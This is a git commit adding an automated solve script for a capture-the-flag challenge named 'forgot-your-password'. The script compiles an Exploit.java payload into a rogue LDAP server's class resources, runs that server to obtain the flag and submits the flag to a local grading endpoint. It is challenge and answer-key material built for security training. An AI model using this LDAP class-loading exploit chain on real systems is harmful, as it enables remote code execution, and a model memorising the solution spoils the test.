e39312bb8d9c404e2963a33dab3d1b781455e9df
Miroslav Holeček <miroslav@holecekm.cz>
2025-01-06 22:50:30 +0100

    miro/forgot-your-password: ensure solvability (traffic forwarder), solve script

---
+++ campaigns/miro/forgot-your-password/auto-solve.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+
+set -e
+
+cd auto-solve
+# compile the payload and allow the LDAP server's ClassLoader to access it
+# (using older Java because older openjdk docker images are smaller)
+javac Exploit.java -source 8 -target 8 -d ldap-server/src/main/resources/
+
+cd ldap-server
+mvn clean package
+FLAG=$(java -jar target/ldap-server-1.0-SNAPSHOT.jar)
+
+RES=$(curl -s 'http://172.20.0.3/submit' \
+   -X POST \
+   -H 'Content-Type: application/json' \
+   --data-binary "{\"challenge_id\": \"forgot-your-password\", \"task_id\": \"dashboard-content\", \"flag\" : \"$FLAG\"}")
+
+if [[ $RES != *"Congratulations"* ]]; then
+ echo "Failed to submit the flag - $RES"
+ exit 5
+fi
+
+echo "OK - tests passed"
+exit 0
